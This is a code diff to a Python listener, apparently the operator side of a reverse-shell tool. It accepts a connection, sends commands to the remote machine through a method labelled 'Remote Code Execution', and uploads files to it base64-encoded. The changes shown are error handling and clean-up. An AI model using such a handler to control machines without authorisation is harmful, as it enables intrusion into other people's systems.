@@ -33,6 +33,7 @@ class Server:
 		# Set port to the one specified during object instantiation
 		self.host = "0.0.0.0"
 		self.port = port
+		self.base_dir = os.getcwd()
 		
 		# Create a socket object, bind it to the host, listen for connections and inform the user
 		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,13 +42,15 @@ class Server:
 		listener.listen(5)
 		print(f"Listening on {self.host}:{self.port}")
 
-		# Accept connections and create a separate thread for each connection
+		# Loop till connection is received
 		while True:
 			self.connection, self.address = listener.accept()
 			print()
 			print(f"Received connection from {self.address}")
-			ct = threading.Thread(target=self.handle, args=())
-			ct.start()
+			break
+		# Start a thread to handle the connection
+		ct = threading.Thread(target=self.handle, args=())
+		ct.start()
 	
 
 	# Define method to handle connections
@@ -59,10 +62,14 @@ class Server:
 
 			# Check if upload command was used (append a new-line sentinel no matter the command)
 			if command[0:6] == "upload":
-				# Use the upload_file function to get base64 file and SHA256 hash
-				content,chash = self.upload_file(command)
-				# Create the bytes object to be sent
-				command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
+				try:
+					# Use the upload_file function to get base64 file and SHA256 hash
+					content,chash = self.upload_file(command)
+					# Create the bytes object to be sent
+					command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
+				except Exception as e:
+					print(f"Error: {str(e)}")
+					continue
 			else:
 				command += "\n"
 
@@ -71,7 +78,7 @@ class Server:
 				print(f"Closing connection to {self.address[0]}")
 				self.connection.send(bytes(command, "utf-8"))
 				print("Connection closed")
-				sys.exit(0)
+				return
 
 			# Get the response using the Remote Code Execution (RCE) function
 			response = self.rce(command)
@@ -117,17 +124,20 @@ class Server:
 	def upload_file(self, command):
 		# Get the file name from the second part of the input
 		path = command.split(" ")[1]
-		with open(path, "rb") as up_file:
-			# Read the file and hash its contents
-			content = up_file.read()
-			content_hash = hashlib.sha256(content).hexdigest()
-			# Convert the hash and contents to bytes
-			if type(content) is not bytes:
-				content = bytes(content, "utf-8")
-			if type(content_hash) is not bytes:
-				content_hash = bytes(content_hash, "utf-8")
-			# Return hash and base64 encoded contents
-			return base64.b64encode(content), content_hash
+		try:
+			with open(path, "rb") as up_file:
+				# Read the file and hash its contents
+				content = up_file.read()
+				content_hash = hashlib.sha256(content).hexdigest()
+				# Convert the hash and contents to bytes
+				if type(content) is not bytes:
+					content = bytes(content, "utf-8")
+				if type(content_hash) is not bytes:
+					content_hash = bytes(content_hash, "utf-8")
+				# Return hash and base64 encoded contents
+				return base64.b64encode(content), content_hash
+		except FileNotFoundError:
+			raise Exception(f"{path} does not exist in {self.base_dir}\n")
 	
 	
 	# Define method to executre commands remotely
@@ -325,9 +335,6 @@ def define_args():
 
 # Define the driver method for the program
 def main():
-	if float(''.join(sys.version.split(' ')[0].split('.')[0:2]))/10 < 3.6:
-		print("Error: Python version >=3.6 required.")
-		sys.exit(0)
 	# Get the arguments with the define_args method
 	args = define_args()
 
